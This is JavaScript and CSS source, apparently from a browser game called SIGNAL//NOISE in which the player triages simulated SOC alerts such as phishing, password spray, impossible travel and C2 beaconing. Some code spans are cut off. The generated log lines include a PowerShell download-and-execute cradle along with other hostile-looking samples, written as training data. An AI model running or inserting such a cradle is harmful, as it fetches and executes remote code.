body{overscroll-behavior:none;-webkit-tap-highlight-color:transparent}
#mtabs{display:none}
#stage.mobile{--mtab-h:60px}
#stage.mobile #desk,#stage.mobile .stand,#stage.mobile .logo,#stage.mobile .hud-sep,#stage.mobile #lampGlow{display:none}
#stage.mobile #sky{height:100%}
#stage.mobile kbd,#stage.mobile .kbdhint{display:none}
#stage.mobile #hud{top:max(6px,env(safe-area-inset-top));left:6px;right:6px;height:auto;flex-wrap:wrap;row-gap:6px;column-gap:8px;padding:7px 10px}
#stage.mobile .clockbox{flex:1 1 auto;gap:6px}
#stage.mobile #hudClock{font-size:24px;min-width:0}
#stage.mobile .stats{order:5;flex:1 1 100%;gap:10px}
#stage.mobile .stat{max-width:none;min-width:0}
#stage.mobile .stat label{letter-spacing:.06em}
#stage.mobile .hud-right{gap:5px}
#stage.mobile .chip.tier,#stage.mobile #btnFF{display:none}
#stage.mobile #monitors{top:calc(var(--hud-h,96px) + 12px);bottom:calc(var(--mtab-h) + env(safe-area-inset-bottom) + 8px);left:6px;right:6px;gap:0;perspective:none}
#stage.mobile .mon{display:none;flex:1 1 auto;transform:none!important}
#stage.mobile .mon.mshow{display:flex}
#stage.mobile .bezel{border-width:3px}
#stage.mobile .qrow{padding:10px 8px}
#stage.mobile .ev{padding:7px 9px}
#stage.mobile .actions .btn{padding:10px 6px}
#stage.mobile .tab,#stage.mobile .ctab{padding:8px 10px}
#stage.mobile #mtabs{display:flex;position:absolute;left:0;right:0;bottom:0;z-index:6;height:calc(var(--mtab-h) + env(safe-area-inset-bottom));padding:0 4px env(safe-area-inset-bottom);
  background:rgba(6,10,18,.9);backdrop-filter:blur(14px);border-top:1px solid var(--line-2);box-shadow:0 -8px 24px rgba(0,0,0,.45)}
#mtabs button{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;font:700 11.5px var(--mono);letter-spacing:.08em;color:var(--muted);position:relative;border-radius:10px;margin:5px 2px}
#mtabs button .mi{font-size:20px;line-height:1}
#mtabs button.on{color:var(--cyan);background:rgba(62,240,255,.09);box-shadow:inset 0 0 0 1px var(--line-2)}
#mtabs .mb{position:absolute;top:2px;right:calc(50% - 30px);min-width:18px;padding:0 5px;border-radius:9px;background:var(--magenta);color:#fff;font:800 10.5px/18px var(--mono);text-align:center}
#mtabs .mb:empty{display:none}
#mtabs #mCoffee.low{color:var(--amber)}
#stage.mobile #toasts{top:calc(var(--hud-h,96px) + 14px);right:auto;left:50%;transform:translateX(-50%);align-items:center;width:92%}
#stage.mobile .toast{text-align:center}
#stage.mobile .cards{grid-template-columns:1fr;gap:8px}
#stage.mobile .pcard{min-height:0;flex-direction:row;flex-wrap:wrap;text-align:left;justify-content:flex-start;padding:10px 12px;column-gap:10px}
#stage.mobile .pcard .pc-ico{font-size:28px}
#stage.mobile .pcard .pc-desc,#stage.mobile .pcard .pc-foot{flex:1 1 100%}
#stage.mobile .grid3{grid-template-columns:repeat(auto-fill,minmax(150px,1fr))}
#stage.mobile .grid2{grid-template-columns:repeat(auto-fill,minmax(230px,1fr))}
#stage.mobile .title-screen{padding:24px 16px 18px}
#stage.mobile .title-screen h1{font-size:34px}
#stage.mobile .title-screen .sub{letter-spacing:.16em}
#stage.mobile .menu{width:100%;max-width:320px}
#stage.mobile .panel,#stage.mobile .modal{width:calc(var(--sw) * 96)!important;max-height:calc(var(--sh) * 94)}
#stage.mobile .panel-h,#stage.mobile .panel-f,#stage.mobile .modal-f{flex-wrap:wrap;padding-left:14px;padding-right:14px}
#stage.mobile .panel-b,#stage.mobile .modal-b{padding:12px 14px}
#stage.mobile .modal-f .btn,#stage.mobile .panel-f .btn{padding:10px 12px}
#stage.mobile .bigstat{font-size:22px}

.glist li small{font:600 11px var(--mono);white-space:nowrap}.glist li.gr span{color:var(--green)}.glist li.rd span{color:var(--red)}.glist li.am span{color:var(--amber)}.glist li.muted span{color:var(--muted)}
.stable{font-size:13.5px}.sth,.str{display:grid;grid-template-columns:34px 1.2fr 1fr .9fr .9fr .8fr .6fr .7fr .6fr;gap:6px;padding:6px 8px;align-items:center}

.lbrow{display:grid;grid-template-columns:52px 1fr auto;gap:10px;align-items:center;padding:8px 10px;border-radius:8px;border:1px solid var(--line);margin-bottom:5px;background:rgba(255,255,255,.02)}

<script>

/* =====================================================================
   SIGNAL//NOISE — a SOC analyst roguelike
   Sections:
     1. Utilities & seeded RNG
     2. Persistence (localStorage, try/catch wrapped)

const $ = (s, r = document) => r.querySelector(s);
const $$ = (s, r = document) => Array.from(r.querySelectorAll(s));
const clamp = (v, a, b) => Math.max(a, Math.min(b, v));

const pad2 = n => String(n).padStart(2, '0');
const esc = s => String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

      : L(`TI verdict: clean (${R.int(0, 2)} low-confidence reports)`, 'n', 'No meaningful threat intel hits.'));
  } else lines.push(L('TI verdict: — feed not licensed (unlock "Threat Intel Feed")', 'n', 'No intel available.'));
  return lines.concat(extra);
}

/* ---------------------------------------------------------------------
   5. ALERT GENERATORS
   Each returns {title, desc, src, sev, ent, ev:{logs,ip,user,proc,email}, contain:[...]}.
   truth: 'TP' (malicious) | 'BTP' (real but authorised) | 'FP' (detection error)
   d = difficulty (0..~1.5). c = context {org, t, shiftType, ti, changes:[]}
   --------------------------------------------------------------------- */
const GEN = {};

GEN.phishing = (R, truth, d, c) => {
  const u = R.pick(c.org.users), t = c.t;
  const ev = { email: [], user: [], logs: [], ip: [] }, ent = { user: u.un };
  const subj = R.pick(['Urgent: wire transfer needed before 3pm', 'Your mailbox is 98% full', 'Action required: payroll details update', 'Shared with you: Q4 Bonus Plan.xlsx', 'Contract awaiting your e-signature', 'Invoice #' + R.int(10000, 99999) + ' is overdue']);
  let title = R.chance(.6) ? 'User-reported phishing' : 'Email gateway: suspicious message', sev = R.pick([1, 1, 2]), contain = ['ip'];
  if (truth === 'TP') {
    const ex = R.pick(c.org.execs), dom = c.forceDomain || R.pick(LOOKALIKES), ip = c.forceIP || extIP(R), sub = R.chance(clamp(d, 0, .85));
    const clicked = c.forceClick != null ? c.forceClick : R.chance(.45 + d * .2);
    Object.assign(ent, { ip, domain: dom });
    ev.email = [
      L(`From: "${ex.name}" <${ex.first.toLowerCase()}@${dom}>`, 'b', `Display name impersonates ${ex.title} ${ex.name}, but "${dom}" is a lookalike of ${ORG.domain}.`),
      L(`To: ${u.un}@${ORG.domain}`, 'n', 'Recipient.'),
      sub ? L(`Reply-To: (none)`, 'n', 'No reply-to diversion here.') : L(`Reply-To: ${ex.first.toLowerCase()}.${R.int(10, 99)}@${R.pick(FREEMAIL)}`, 'b', 'Replies are diverted to a free webmail account — exec email never does this.'),
      L(`Return-Path: <bounce@${dom}>`, 'n', 'Aligned with the (lookalike) sender domain.'),
      L(`Received: from mx1.${dom} (${ip})`, 'n', `Sending server ${ip} — check the IP tab.`),
      sub ? L(`Authentication-Results: spf=pass dkim=pass dmarc=pass header.from=${dom}`, 'n', 'Passes — for the attacker\'s OWN lookalike domain. Authentication ≠ legitimacy.')
        : L(`Authentication-Results: spf=fail dkim=none dmarc=fail header.from=${dom}`, 'b', 'SPF/DMARC fail: the sending server is not authorised for this domain.'),
      L(`Subject: ${subj}`, 'n', 'Urgency is a lure, but not proof on its own.'),
      L(`Body link: hxxps://${dom}/sso/login?user=${u.un}`, 'b', 'Points to a credential-harvesting page on the lookalike domain.'),
    ];
    ev.user = userLines(u, [clicked
      ? L(`Proxy: ${u.un} → ${dom}/sso/login at ${fmtClock(t + 2)} (POST 2.1 KB)`, 'b', 'User clicked AND submitted a form — credentials are likely compromised. Disabling the account is the right containment.')
      : L(`Proxy: no requests from ${u.un} to ${dom}`, 'n', 'User did not click. Blocking the sender is enough.')]);
    ev.ip = ipLines(R, ip, 'bad', c);
    ev.logs = [L(`${ts(t, R, 5)} GW deliver msgid=<${R.hex(8)}@${dom}> rcpt=${R.int(3, 40)} users verdict=pass(score 3.1)`, 'n', 'Gateway let it through with a low score.')];
    contain = clicked ? ['account', 'ip'] : ['ip'];
    sev = clicked ? 2 : sev;
  } else if (truth === 'BTP') {
    ev.email = [
      L(`From: "IT Service Desk" <it-support@hd-securetraining.com>`, 'n', 'Looks suspicious at first glance…'),
      L(`To: ${u.un}@${ORG.domain}`, 'n', 'Recipient.'),
      L(`Received: from mail.phishdrill-sim.net (${extIP(R)})`, 'c', 'PhishDrill — our approved phishing-simulation vendor.'),
      L(`Authentication-Results: spf=pass dkim=pass dmarc=pass`, 'n', 'Authenticated.'),
      L(`X-Sim-Campaign: AWARE-Q${R.int(1, 4)}-${R.hex(4)}`, 'c', 'Header injected by the security-awareness simulation platform. This is a sanctioned test.'),
      L(`Subject: ${subj}`, 'n', 'Lure.'),
      L(`Body link: hxxps://hd-securetraining.com/landing/${R.hex(6)}`, 'n', 'Lands on a training page.'),
    ];
    ev.user = userLines(u);
  } else {
    const [vn, vd] = R.pick(VENDORS);
    ev.email = [
      L(`From: "${vn}" <news@${vd}>`, 'n', 'Domain matches a long-standing vendor.'),
      L(`To: ${u.un}@${ORG.domain}`, 'n', 'Recipient.'),
      L(`Return-Path: <bounce@mail.${vd}>`, 'n', 'Aligned with sender.'),
      L(`Received: from mail.${vd} (${extIP(R)})`, 'n', 'Vendor mail server.'),
      L(`Authentication-Results: spf=pass dkim=pass dmarc=pass header.from=${vd}`, 'n', 'Fully authenticated and aligned.'),
      L(`Subject: ${vn} — ${R.pick(['November product update', 'Your monthly statement is ready', 'Webinar invite: what\'s new'])}`, 'n', 'Routine.'),
      L(`Body link: https://${vd}/news/${R.hex(4).toLowerCase()}`, 'n', 'Links only to the vendor\'s real domain.'),
    ];
    ev.logs = [L(`${ts(t, R, 5)} GW deliver from=news@${vd} rcpt=${R.int(800, 3200)} reports=1`, 'n', 'Bulk vendor newsletter; one cautious user reported it.')];
    ev.user = userLines(u);
  }
  return { title, src: 'Email GW', sev, ent, ev, contain, desc: `${u.name} (${u.deptName}) — "${subj}"` };
};

GEN.brute = (R, truth, d, c) => {
  const t = c.t, ev = { logs: [], ip: [], user: [] };
  if (truth === 'TP') {
    const ip = c.forceIP || extIP(R), victim = R.pick(c.org.users), method = R.pick(['VPN', 'OWA', 'SSO']);
    const targets = R.shuffle(c.org.users).slice(0, 7);
    ev.logs = targets.slice(0, 5).map((u, i) => L(`${fmtClock(t - 6 + i)}:${pad2(R.int(0, 59))} AUTH FAIL user=${u.un} src=${ip} method=${method} reason=bad_password`, 'n', 'One failure on its own means nothing.'));
    ev.logs.push(L(`… ${R.int(38, 140)} more failures for ${R.int(30, 90)} distinct users from ${ip} in ${R.int(4, 9)} min`, 'b', 'One source, MANY usernames, few attempts each = password spray.'));
    ev.logs.push(L(`${fmtClock(t)}:${pad2(R.int(0, 59))} AUTH SUCCESS user=${victim.un} src=${ip} method=${method}`, 'b', `The spray worked: ${victim.un} was logged into from attacker infrastructure. Block the IP (and consider disabling the account).`));
    ev.ip = ipLines(R, ip, 'bad', c);
    ev.user = userLines(victim);
    return { title: 'Password spray against ' + method, src: 'IdP', sev: R.pick([1, 2]), ent: { ip, user: victim.un }, ev, contain: ['ip', 'account'], desc: `Excessive authentication failures across many accounts from ${ip}.` };
  }
  const u = R.pick(c.org.users), ip = intIP(R);
  ev.logs = [];
  for (let i = 0; i < 6; i++) ev.logs.push(L(`${fmtClock(t - 8 + i)}:${pad2(R.int(0, 59))} AUTH FAIL user=${u.un} src=${ip} method=SSO reason=bad_password`, 'n', 'Same user, same internal IP, repeated failures.'));
  if (truth === 'BTP') {
    ev.logs.unshift(L(`${fmtClock(t - 20)} HELPDESK INC-${R.int(40000, 49999)} password reset for ${u.un} (verified by phone)`, 'c', 'User had a password reset minutes earlier — the old password is cached on their phone mail client.'));
  } else {
    ev.logs.push(L(`${fmtClock(t)}:${pad2(R.int(0, 59))} AUTH SUCCESS user=${u.un} src=${ip} method=SSO mfa=passed`, 'n', 'Eventually succeeded from the user\'s own workstation with MFA. Fat fingers.'));
  }
  ev.ip = ipLines(R, ip, 'scan', c, [L(`Asset: ${u.host} (assigned to ${u.un})`, 'c', 'The source is the user\'s own laptop on the corporate network.')]);
  ev.user = userLines(u);
  return { title: 'Brute-force: repeated auth failures', src: 'IdP', sev: R.pick([0, 1, 1, 2]), ent: { ip, user: u.un }, ev, contain: ['ip'], desc: `${u.un} — multiple failed logins.` };
};

GEN.travel = (R, truth, d, c) => {
  const u = c.forceUser ? findUser(c.org, c.forceUser) : R.pick(c.org.users), t = c.t, home = u.city;
  const far = R.pick(FOREIGN), dist = hav(home, far), gap = R.int(25, 90);
  const ev = { user: [], ip: [], logs: [] }, ip = c.forceIP || extIP(R);
  const t1 = fmtClock(t - gap), t2 = fmtClock(t);
  ev.user = userLines(u, [
    L(`Login 1: ${t1}  ${home}  device=${u.host} (managed)  mfa=passed`, 'n', 'Normal login from the usual location and device.'),
    L(`Login 2: ${t2}  ${far}  device=${truth === 'TP' ? R.pick(['Linux / Firefox (unmanaged)', 'Unknown Android', 'Windows / Chrome (unmanaged)']) : (truth === 'BTP' ? u.host + ' (managed)' : u.host + ' (managed)')}`,
      truth === 'TP' ? 'b' : 'n', truth === 'TP' ? `${dist.toLocaleString()} km in ${gap} min (≈${Math.round(dist / (gap / 60)).toLocaleString()} km/h) on an UNMANAGED device — physically impossible.` : `${dist.toLocaleString()} km in ${gap} min — but it's the same managed laptop. Look for an explanation.`),
  ]);
  if (truth === 'TP') {
    ev.user.push(L(`MFA: ${R.int(5, 14)} push prompts in 3 min → approved at ${t2}`, 'b', 'MFA fatigue — the user approved a push to make the prompts stop.'));
    if (R.chance(.6 - d * .3)) ev.user.push(L(`Mailbox: new inbox rule "zz" → move mail containing "invoice" to RSS Feeds`, 'b', 'Attackers hide replies with inbox rules after account takeover.'));
    ev.ip = ipLines(R, ip, 'bad', c);
  } else if (truth === 'BTP') {
    const vpn = R.chance(.5);
    ev.user.push(vpn ? L(`Login 2 source ASN: AS64900 Halcyon Corp VPN (${far} egress node)`, 'c', 'Corporate VPN egress — the user simply connected to a distant VPN node.')
      : L(`HR travel calendar: ${u.first} in ${far} for the regional offsite this week`, 'c', 'Approved business travel; the first login was a laptop session restored over Wi-Fi.'));
    ev.ip = ipLines(R, ip, vpn ? 'corp' : 'res', c);
  } else {
    ev.user.push(L(`Login 2 source ASN: ${R.pick(RES_ASN)} — same ISP as Login 1`, 'c', 'Same ISP and device; the geo-IP database mislabeled a new address block. Detection error.'));
    ev.ip = ipLines(R, ip, 'res', c);
  }
  return { title: 'Impossible travel', src: 'IdP', sev: truth === 'TP' ? 2 : R.pick([1, 2]), ent: { user: u.un, ip }, ev, contain: ['account'], desc: `${u.un}: ${home} → ${far} within ${gap} minutes.` };
};

GEN.beacon = (R, truth, d, c) => {
  const u = c.forceUser ? findUser(c.org, c.forceUser) : R.pick(c.org.users), host = u.host, t = c.t;
  const ip = c.forceIP || extIP(R), ev = { logs: [], ip: [], proc: [] };
  const dom = truth === 'TP' ? R.pick(['cdn-sync', 'api-telemetry', 'update-check', 'img-static']) + '.' + R.pick(['top', 'xyz', 'online', 'site']) : R.pick(['updates.contoso-software.com', 'telemetry.stratus-cloud.net', 'sync.clouddesk.io']);
  const per = truth === 'TP' ? R.pick([60, 90, 120, 300]) : 0;
  for (let i = 0; i < 4; i++) {
    const tt = t - 4 + i;
    ev.logs.push(L(`${fmtClock(tt)}:${truth === 'TP' ? pad2((i * per) % 60) : pad2(R.int(0, 59))} FLOW ${host} → ${ip}:443 (${dom}) bytes_out=${truth === 'TP' ? 312 + R.int(0, 4) : R.int(800, 90000)}`, 'n', 'A single connection.'));
  }
  if (truth === 'TP') {
    ev.logs.push(L(`Summary: ${R.int(280, 720)} connections in ${R.int(6, 14)}h, interval ${per}s ± ${R.int(1, 3)}%, payload ~312 B`, 'b', 'Metronome-regular, tiny, identical-size check-ins = beaconing to C2.'));
    ev.logs.push(L(`DNS: ${dom} registered ${R.int(2, 6)} days ago (privacy-protected)`, 'b', 'Freshly-registered domain — no legitimate update service is that new.'));
    ev.proc = [
      L('explorer.exe (pid 4120)', 'n', 'User shell.', 0),
      L(d > .6 ? `└─ OneDriveUpdater.exe  C:\\Users\\${u.un}\\AppData\\Roaming\\OneDriveUpdater.exe` : '└─ svchost.exe  C:\\ProgramData\\svchost.exe', 'b', 'System-named binary running from a user-writable path. The real one lives in System32 / Program Files.', 1),
      L('    └─ network: ' + ip + ':443 every ' + per + 's', 'b', 'This process is the beacon source.', 2),
      L('└─ teams.exe  C:\\Program Files\\Teams\\teams.exe', 'n', 'Normal.', 1),
    ];
    ev.ip = ipLines(R, ip, 'bad', c);
  } else {
    ev.logs.push(L(`Summary: ${R.int(20, 80)} connections in 12h, irregular intervals, variable payloads`, 'n', 'Irregular, variable traffic — not beacon-like.'));
    ev.logs.push(L(`Domain category: Software Updates · registered ${R.int(6, 14)} years ago`, 'c', 'Long-established vendor update service. The beacon rule misfired on periodic sync.'));
    ev.proc = [L('services.exe', 'n', 'System.', 0), L(`└─ ${dom.split('.')[1]}-agent.exe  C:\\Program Files\\${dom.split('.')[1]}\\agent.exe  (signed)`, 'c', 'Signed vendor agent in Program Files.', 1)];
    ev.ip = ipLines(R, ip, 'cloud', c);
  }
  return { title: 'Possible C2 beacon', src: 'NetFlow', sev: R.pick([1, 2, 2]), ent: { host, ip, user: u.un }, ev, contain: ['host'], desc: `${host} making periodic outbound connections to ${dom}.` };
};

GEN.ps = (R, truth, d, c) => {
  const u = R.pick(c.org.users), host = u.host, t = c.t, ev = { proc: [], logs: [], user: [] };
  if (truth === 'TP') {

    ev.logs = [
      L(`${ts(t, R)} EDR ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('${url}')`, 'b', 'Download-and-execute cradle.'),

GEN.exfil = (R, truth, d, c) => {

      L(`${fmtClock(t)} DLP match: ${R.int(400, 2600)} records w/ customer PII patterns`, 'b', 'Sensitive data in the transfer.'),

    ev.ip = ipLines(R, ip, 'bad', c);
    return { title: 'Data exfiltration: large upload', src: 'DLP', sev: c.chainFinal ? 3 : 2, ent: { user: u.un, host: u.host, ip }, ev, contain: ['account', 'host'], desc: `${gb} GB uploaded to an external site by ${u.un}.` };
  }
  if (truth === 'BTP') {
    ev.logs = [
      L(`${fmtClock(t)} PROXY ${u.un} PUT https://portal.auditfirm-secure.com/upload  ${gb} GB`, 'n', 'Large upload.'),
      L(`CHG-${R.int(7000, 7999)}: "Year-end audit evidence transfer to external auditors" requester=${u.un} approved=Legal`, 'c', 'Approved, documented transfer to the contracted audit firm.'),

  } else {

GEN.privesc = (R, truth, d, c) => {

GEN.ddos = (R, truth, d, c) => {

/** Aggregate run-long card modifiers (cached until the card list changes). */

  const r = S.run, key = (r ? r.diff || '' : '') + '|' + (r && r.cards ? r.cards.map(c => c.id + c.n).join(',') : '');
  if (S._modsKey === key && S._mods) return S._mods;

/** Build a rotating schedule: blocks of 3–4 shifts, then 2–3 days off, sometimes flipping DAY/NIGHT. */
function buildSchedule(seed) {
  const R = makeRng(seed + '|sched'), out = [];
  let type = 'DAY', first = true;
  while (out.length < 240) {
    const on = first ? 3 : R.int(3, 4);
    for (let i = 0; i < on; i++) out.push(type);
    const off = R.int(2, 3);
    for (let i = 0; i < off; i++) out.push('OFF');
    if (first || R.chance(.55)) type = type === 'DAY' ? 'NIGHT' : 'DAY';
    first = false;
  }
  return out;
}

/** Keep at least 60 days of schedule ahead (very long careers outrun the initial 240 days). */
function ensureSchedule(r) {
  while (r.schedule.length < r.dayIdx + 60) {
    const R = makeRng(r.seed + '|sched+' + r.schedule.length), last = r.schedule.filter(x => x !== 'OFF').pop() || 'DAY';
    const type = R.chance(.55) ? (last === 'DAY' ? 'NIGHT' : 'DAY') : last;
    for (let i = 0, on = R.int(3, 4); i < on; i++) r.schedule.push(type);
    for (let i = 0, off = R.int(2, 3); i < off; i++) r.schedule.push('OFF');
  }
}

function finalizeShift(sel) {

  Lf.bosses += st.bosses; Lf.bossWon += st.bossWon; Lf.nights += st.nights; Lf.cards += (r.cardLog || []).length; Lf.endings[cause] = (Lf.endings[cause] || 0) + 1;

  // Run history entry (kept in the profile, newest first, capped at 100)

    date: new Date().toISOString(), seed: r.seed, cause, diff: r.diff || 'standard', pid: S.meta.profile.id, name: S.meta.profile.name, detail: detail || '', shifts: r.shiftCount, tier: r.tier, startTier: r.startTier,

function cardStacks(id) { if (!S.run) return 0; const c = S.run.cards.find(x => x.id === id); return c ? c.n : 0; }

/* ---------- Window: sky + skyline (canvas) ---------- */
const SKY_KEYS = [[0, '#03040c', '#0b0a24'], [4.5, '#05061a', '#151035'], [5.6, '#1d1a4a', '#7a3d6a'], [6.6, '#3f5ea8', '#ff9a62'], [8, '#3f8fe0', '#a9d8ff'], [12, '#2f86e8', '#9fd2ff'], [16.5, '#3f7fd0', '#ffc78a'], [18, '#3b3f8a', '#ff6a4a'], [19.1, '#1a1745', '#5a2a5e'], [20.5, '#060718', '#120f30'], [24, '#03040c', '#0b0a24']];
function hexMix(a, b, t) { const pa = parseInt(a.slice(1), 16), pb = parseInt(b.slice(1), 16); const ch = s => [(s >> 16) & 255, (s >> 8) & 255, s & 255]; const A = ch(pa), B = ch(pb); return 'rgb(' + A.map((v, i) => Math.round(lerp(v, B[i], t))).join(',') + ')'; }
function skyAt(h) { for (let i = 0; i < SKY_KEYS.length - 1; i++) { const a = SKY_KEYS[i], b = SKY_KEYS[i + 1]; if (h >= a[0] && h <= b[0]) { const t = (h - a[0]) / (b[0] - a[0]); return [hexMix(a[1], b[1], t), hexMix(a[2], b[2], t)]; } } return [SKY_KEYS[0][1], SKY_KEYS[0][2]]; }

const SKYLINE = (() => {
  const R = makeRng('skyline'), far = [], near = [], stars = [];
  let x = 0; while (x < 1) { const w = R.int(25, 60) / 1000; far.push({ x, w, h: R.int(18, 42) / 100 }); x += w + .002; }
  x = -0.01; while (x < 1) { const w = R.int(30, 80) / 1000, h = R.int(12, 34) / 100, win = []; for (let i = 0; i < 40; i++) win.push([R.f(), R.f(), R.chance(.45)]); near.push({ x, w, h, win, neon: R.chance(.12) ? R.pick(['#ff3bd4', '#3ef0ff', '#ffb547']) : null, spire: R.chance(.15) }); x += w + R.int(2, 8) / 1000; }
  for (let i = 0; i < 90; i++) stars.push([R.f(), R.f() * .55, R.f()]);
  return { far, near, stars };
})();
let lastSkyKey = '';
function drawSky(force) {
  const cv = $('#sky'), s = sh();
  const abs = s ? s.base + s.t : 1260; // idle: 21:00 neon skyline
  const h = (abs % 1440) / 60, key = Math.floor(abs / 2) + ':' + cv.clientWidth + 'x' + cv.clientHeight;
  if (!force && key === lastSkyKey) return; lastSkyKey = key;
  const dpr = Math.min(3, (window.devicePixelRatio || 1) * (S.scale || 1)), W = cv.clientWidth, H = cv.clientHeight;
  if (cv.width !== Math.round(W * dpr) || cv.height !== Math.round(H * dpr)) { cv.width = Math.round(W * dpr); cv.height = Math.round(H * dpr); }
  const c = cv.getContext('2d'); c.setTransform(dpr, 0, 0, dpr, 0, 0);
  const [top, bot] = skyAt(h), n = nightness(h), hor = H * .88;
  const g = c.createLinearGradient(0, 0, 0, hor); g.addColorStop(0, top); g.addColorStop(1, bot);
  c.fillStyle = g; c.fillRect(0, 0, W, H);
  if (n > 0) { c.fillStyle = '#fff'; SKYLINE.stars.forEach(([x, y, b]) => { c.globalAlpha = n * (.3 + .7 * b); c.fillRect(x * W, y * H, 1.3, 1.3); }); c.globalAlpha = 1; }
  // sun / moon arc
  if (h >= 5.6 && h <= 18.6) {
    const p = (h - 5.6) / 13, sx = W * (.08 + .84 * p), sy = hor - Math.sin(Math.PI * p) * H * .75;
    const sg = c.createRadialGradient(sx, sy, 0, sx, sy, 90); sg.addColorStop(0, 'rgba(255,240,200,1)'); sg.addColorStop(.12, 'rgba(255,220,150,.9)'); sg.addColorStop(1, 'rgba(255,180,100,0)');
    c.fillStyle = sg; c.beginPath(); c.arc(sx, sy, 90, 0, 7); c.fill();
  } else {
    const p = ((h + 24 - 18.6) % 24) / 11, mx = W * (.1 + .8 * p), my = hor - Math.sin(Math.PI * clamp(p, 0, 1)) * H * .7;
    c.fillStyle = 'rgba(230,240,255,.9)'; c.beginPath(); c.arc(mx, my, 14, 0, 7); c.fill();
    c.fillStyle = top; c.beginPath(); c.arc(mx + 6, my - 3, 12, 0, 7); c.fill();
  }
  // far skyline
  c.fillStyle = hexMix('#1a2a44', '#0a0f1e', n); SKYLINE.far.forEach(b => c.fillRect(b.x * W, hor - b.h * H, b.w * W, b.h * H + 20));
  // near skyline with windows & neon
  SKYLINE.near.forEach(b => {
    const bx = b.x * W, bw = b.w * W, bh = b.h * H, by = hor - bh;
    c.fillStyle = hexMix('#203250', '#05070e', n); c.fillRect(bx, by, bw, bh + 30);
    if (b.spire) { c.fillRect(bx + bw / 2 - 1.5, by - 22, 3, 22); if (n > .3) { c.fillStyle = 'rgba(255,60,80,' + n + ')'; c.fillRect(bx + bw / 2 - 2, by - 24, 4, 3); } }
    b.win.forEach(([wx, wy, on]) => {
      const x = bx + 3 + wx * (bw - 8), y = by + 4 + wy * (bh - 8);
      if (on && n > .1) { c.fillStyle = `rgba(255,${200 + Math.round(wx * 40)},140,${.75 * n})`; c.fillRect(x, y, 3, 2); }
      else if (n < .6) { c.fillStyle = `rgba(180,220,255,${.18 * (1 - n)})`; c.fillRect(x, y, 3, 2); }
    });
    if (b.neon && n > .2) { c.save(); c.shadowColor = b.neon; c.shadowBlur = 14; c.fillStyle = b.neon; c.globalAlpha = n; c.fillRect(bx + 3, by + 8, bw - 6, 3); c.fillRect(bx + 3, by + 14, (bw - 6) * .6, 2); c.restore(); }
  });
  // window frame mullions + glass reflection
  c.fillStyle = 'rgba(4,6,11,.92)';
  [.25, .5, .75].forEach(f => c.fillRect(W * f - 5, 0, 10, H));
  c.fillRect(0, H * .3, W, 6);
  const rg = c.createLinearGradient(0, 0, W, H); rg.addColorStop(0, 'rgba(255,255,255,.05)'); rg.addColorStop(.4, 'rgba(255,255,255,0)'); rg.addColorStop(1, 'rgba(62,240,255,.04)');
  c.fillStyle = rg; c.fillRect(0, 0, W, H);
}

function noteHTML(n, compact) {
  if (!n) return '';

  const tickets = n.open.map(id => { const a = getAlert(id); return a ? `<span class="mono">${a.id}</span> [${SEV[a.sev]}] ${esc(a.title)} — <i>"${esc(slop(a.npc || ''))}"</i>` : id; });
  return `<div class="notecard" style="border-color:${n.color}55"><h4 style="color:${n.color}">FROM: ${esc(n.author.toUpperCase())} · ${s.type === 'DAY' ? 'NIGHT' : 'DAY'} SHIFT</h4>${n.sloppy ? '<div class="muted" style="font-size:12.5px">' + esc(slop('Sorry, crazy shift, writing this fast')) + '…</div>' : '<div class="muted" style="font-size:12.5px">Clean handoff — all items reviewed.</div>'}</div>

function modal({ title, ico, body, buttons = [{ label: 'OK', cls: 'primary' }], wide, alarm, onClose, onOpen }) {
  S.modal++;
  const back = document.createElement('div'); back.className = 'modal-back';
  back.innerHTML = `<div class="modal ${wide ? 'wide' : ''} ${alarm ? 'alarm' : ''}" role="dialog" aria-modal="true" aria-label="${esc(title)}"><div class="modal-h">${ico ? `<span class="ico">${ico}</span>` : ''}<h3>${title}</h3></div><div class="modal-b scroll">${body}</div><div class="modal-f"></div></div>`;
  const foot = back.querySelector('.modal-f');
  const close = () => { if (!back.isConnected) return; back.remove(); S.modal = Math.max(0, S.modal - 1); if (onClose) onClose(); dirty(); };
  buttons.forEach(b => {
    const el = document.createElement('button'); el.className = 'btn ' + (b.cls || ''); el.innerHTML = b.label;
    if (b.cls && b.cls.includes('primary')) el.dataset.primary = '1';
    el.onclick = () => { Sound.click(); if (b.keep) { b.fn && b.fn(back, close); return; } close(); b.fn && b.fn(); };
    foot.appendChild(el);
  });
  $('#modalRoot').appendChild(back);
  if (onOpen) onOpen(back);
  const f = foot.querySelector('[data-primary]') || foot.querySelector('button'); if (f) f.focus();
  return { el: back, close };
}

const SAVE_FORMAT = 'signal-noise-save';
/** The in-progress run, whether it lives in S.run, localStorage, or (storage blocked) memory. */
function getSavedRun() {
  if (S.run && !S.run.ended) return S.run;
  return Store.get(SAVE_RUN) || S.suspended || null;
}
function buildSaveFile() {
  if (S.run && !S.run.ended) save();
  const run = getSavedRun();
  const m = Object.assign({}, S.meta); delete m.account; delete m.outbox; // never put the login token in a file
  const body = { meta: m, run: run ? JSON.parse(JSON.stringify(run)) : null };
  return Object.assign({ format: SAVE_FORMAT, version: 2, game: 'SIGNAL//NOISE', exportedAt: new Date().toISOString(), checksum: hashStr(JSON.stringify(body)).toString(16) }, body);
}
function downloadSave() {
  try {
    const p = buildSaveFile(), r = p.run;
    const stamp = new Date().toISOString().slice(0, 16).replace(/[:T]/g, '-');
    const nm = profileName().replace(/[^a-z0-9_-]+/gi, '-').replace(/^-+|-+$/g, '').toLowerCase() || 'analyst';
    const name = `signal-noise-profile-${nm}${r ? '-' + r.seed + '-shift' + (r.shiftCount + 1) : ''}-${stamp}.json`;
    const blob = new Blob([JSON.stringify(p)], { type: 'application/json' });
    const url = URL.createObjectURL(blob), a = document.createElement('a');
    a.href = url; a.download = name; document.body.appendChild(a); a.click(); a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 2000);
    toast('Profile saved: ' + name, 'good');
  } catch (e) { toast('Could not create the profile file', 'bad'); }
}
function describeSave(p) {
  const r = p.run, m = p.meta || {};
  const when = p.exportedAt ? new Date(p.exportedAt).toLocaleString() : 'unknown date';
